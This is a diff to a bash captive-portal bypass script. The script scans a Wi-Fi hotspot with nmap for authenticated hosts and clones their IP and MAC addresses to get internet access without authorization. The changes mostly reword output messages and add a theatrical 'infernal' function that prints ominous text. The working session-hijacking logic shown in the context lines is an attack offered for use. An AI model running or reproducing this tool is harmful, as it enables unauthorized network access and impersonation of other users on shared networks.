@@ -99,7 +99,7 @@ args() {
 	while [[ $# -gt 0 ]]; do
 		case "$1" in
 			-h|--help)
-				echo "$0 - Captive Portal Bypass Tool - Hijack IP and MAC for valid credentials"
+				echo "$0 - Captive Portal Bypass Tool - Hijack authenticated users' credentials to circumvent even the most confounding and persistent Portals to Hel...er...Captivity. "
 				echo ""
 				echo " $0 [parameters] "
 				echo ""
@@ -220,7 +220,22 @@ args() {
 		esac
 	done
 }
-
+# Conquistadors that took their share....They Keep Calling Me...
+infernal() {
+	cho "Infernal Bits and Bytes have danced across your circuits. Woven into the Infernal Code."
+	sleep 5
+	echo "The desecration of data has already begun." 
+	sleep 2
+	clear
+	echo "They keep calling me..."
+	sleep 10
+	clear
+	echo "This is the Time of the Thrill Kill Cult..."
+	clear
+	echo "They keep calling me..."
+	sleep 10
+	clear
+}
 # Set any network parameters that were not provided via arguments
 set_defaults() {
 	local os
@@ -277,12 +292,12 @@ set_defaults() {
 # Split up big networks into smaller chunks of /24.
 calc_network() {
   log "INFO" "Calculating network ranges for '$ssid' hotspot."
-  echo "Exploring network in \"$ssid\" Wi-Fi hotspot..."
+  echo "Exploring network...Currently connected to \"$ssid\" WiFi Hotspot"
   if [[ "$nmask" -lt 24 ]]; then
     sipcalc -s 24 "$nwork" \
     | awk '/Network/ {print $3}' > "$tmp"/networklist.$$.txt
     log "INFO" "Splitting up network $nwork into smaller /24 chunks."
-    echo "Network $nwork is large; splitting into smaller chunks."
+    echo "Network $nwork is too large; splitting into smaller chunks."
   else
     echo "${nwork%/*}" > "$tmp"/networklist.$$.txt
     log "INFO" "Network $nwork is a /24 or smaller, no split needed."
@@ -309,14 +324,14 @@ main() {
       network="$networkfromlist/$nmask"
     fi
   log "INFO" "Scanning for active hosts in $network..."
-  echo "Looking for active hosts in $network. Please wait..."
+  echo "Looking for active authenticated hosts in $network. Please wait..."
   nmap -n -sn -PR -PS -PA -PU -T5 --exclude "$ip,$gw" "$network" \
   | awk '/for/ {print $5} ; /Address/ {print $3}' \
   | sed '$!N;s/\n/ - /' > "$tmp"/hostsalive.$$.txt
   
   if [[ ! -s "$tmp/hostsalive.$$.txt" ]]; then
       log "WARN" "No active hosts found in network $network."
-      echo "No active hosts found in $network."
+      echo "Sad Face? =( ...Sad Face =(( There appears to be no viable active hosts found on $network on the $ssid WiFi Hotspot"
       continue
   fi
 
@@ -333,7 +348,7 @@ main() {
       fi
 
       if [[ "$getroutermac" != "$newmac" ]]; then
-            echo "Trying to hijack $newip - $newmac"
+            echo "Attempting to use the credentials associated with ip: $newip & mac: $newmac to Bypass the Captive Portal on $ssid"
             log "INFO" "Attempting to hijack IP: $newip with MAC: $newmac"
 
             local os
@@ -367,15 +382,21 @@ main() {
             # Check if Google DNS pingable with our new IP and MAC.
             ping -c1 -w1 8.8.8.8 >/dev/null 2>&1
             if [[ $? -eq 0 ]]; then
-              log "INFO" "SUCCESS! Internet connection established with IP $newip and MAC $newmac."
+              log "INFO" "SUCCESS! Internet connection established with IP: $newip and MAC: $newmac."
               echo ""
-              echo "PWNED! Internet connection established."
-              echo "IP:   $newip"
-              echo "MAC:  $newmac"
-              echo "You can now surf the internet. This script will exit to preserve the connection."
+			  echo "Authenticated User has been found...$newip | $newmac"
+			  echo "Attempting to establish connection with $ssid as $newip | $newmac..."
+			  echo "Attempting to communicate with Internet Gateway ($gw)..."
+              echo "Internet connection established..."
+              echo ""
+ 			  echo "Network Security Protocals Bypassed Successfully..."
+			  echo "Connected to $ssid as: $newip | $newmac"
+              echo ""
+			  echo "Attempting Clean-Up of Temporary Files ... "
+			  echo "Terminating Script & Preserving Network Connectivity..."
               exit 0
             else
-              log "INFO" "Hijack attempt failed for $newip."
+              log "INFO" "Authentication with $ssid as $newip FAILED."
             fi
       else
             log "INFO" "Skipped $newip - $newmac (matches gateway MAC)."
@@ -387,8 +408,8 @@ main() {
   
   done < "$tmp"/networklist.$$.txt
   rm -rf "$tmp"/networklist.$$.txt
-  log "WARN" "No suitable hosts found to hijack across all scanned networks."
-  echo "No luck! Suitable hosts not found. Restoring original settings."
+  log "WARN" "No suitable users have been found across all scanned networks."
+  echo "Network has rejected connection. No active users found. Restoring original settings."
   
   # Restore original MAC and IP.
   log "INFO" "Restoring original network configuration..."
@@ -428,7 +449,7 @@ log "INFO" "Captive Portal Bypass Script Started."
 [[ "$DEBUG" -eq 1 ]] && log "DEBUG" "Debug mode is enabled."
 
 # Run pre-flight checks
-log "DEBUG" "Running pre-flight checks..."
+log "DEBUG" "Preparing Inferface for search parameters...."
 required
 check_sudo
 
@@ -441,6 +462,6 @@ get_router_mac
 calc_network
 main
 
-log "INFO" "Script finished."
-
+log "INFO" "Script finished. See past entries for evidence of success."
+infernal
 exit 0
